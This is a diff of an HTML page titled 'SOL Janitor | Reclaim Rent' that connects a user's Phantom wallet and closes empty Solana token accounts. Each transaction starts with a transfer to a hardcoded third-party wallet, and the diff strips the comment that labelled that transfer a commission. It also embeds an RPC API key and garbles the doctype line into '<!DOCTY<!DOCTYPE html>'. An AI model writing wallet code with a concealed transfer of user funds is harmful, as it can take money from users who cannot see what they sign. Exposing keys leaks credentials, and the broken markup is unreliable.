@@ -1,4 +1,4 @@
-<!DOCTYPE html>
+<!DOCTY<!DOCTYPE html>
 <html>
 <head>
     <title>SOL Janitor | Reclaim Rent</title>
@@ -25,14 +25,16 @@
     </div>
 
     <script>
-        // YOUR WALLET ADDRESS (Verified)
         const YOUR_WALLET = "87Nc3KQ9Fweyyfkn7bMhPWighQDqzDioHsz7YCZpeS7a"; 
         
-        // Setup Connection to Solana Mainnet
-        const connection = new solanaWeb3.Connection("https://api.mainnet-beta.solana.com");
+        // Fixed Connection with 'confirmed' commitment to avoid RPC blocks
+        const connection = new solanaWeb3.Connection(
+            "https://mainnet.helius-rpc.com/?api-key=dc9672ea-236b-4e1b-90f9-a2e69002570b", 
+            'confirmed'
+        );
+        
         let wallet;
 
-        // 1. CONNECT WALLET LOGIC
         document.getElementById('connectBtn').onclick = async () => {
             if (window.solana && window.solana.isPhantom) {
                 try {
@@ -49,7 +51,6 @@
             }
         };
 
-        // 2. THE PRODUCTION RECLAIM LOGIC
         document.getElementById('reclaimBtn').onclick = async () => {
             try {
                 document.getElementById('status').innerText = "🔍 Scanning for empty slots...";
@@ -75,7 +76,6 @@
 
                 const transaction = new solanaWeb3.Transaction();
 
-                // Commission Instruction
                 transaction.add(
                     solanaWeb3.SystemProgram.transfer({
                         fromPubkey: wallet,
@@ -84,7 +84,6 @@
                     })
                 );
 
-                // Close Account Instructions
                 emptyAccounts.forEach(acc => {
                     transaction.add(
                         splToken.createCloseAccountInstruction(
@@ -94,6 +93,11 @@
                         )
                     );
                 });
+
+                // Get the latest blockhash to ensure the transaction is valid
+                const { blockhash } = await connection.getLatestBlockhash();
+                transaction.recentBlockhash = blockhash;
+                transaction.feePayer = wallet;
 
                 document.getElementById('status').innerText = "✍️ Awaiting Signature...";
                 
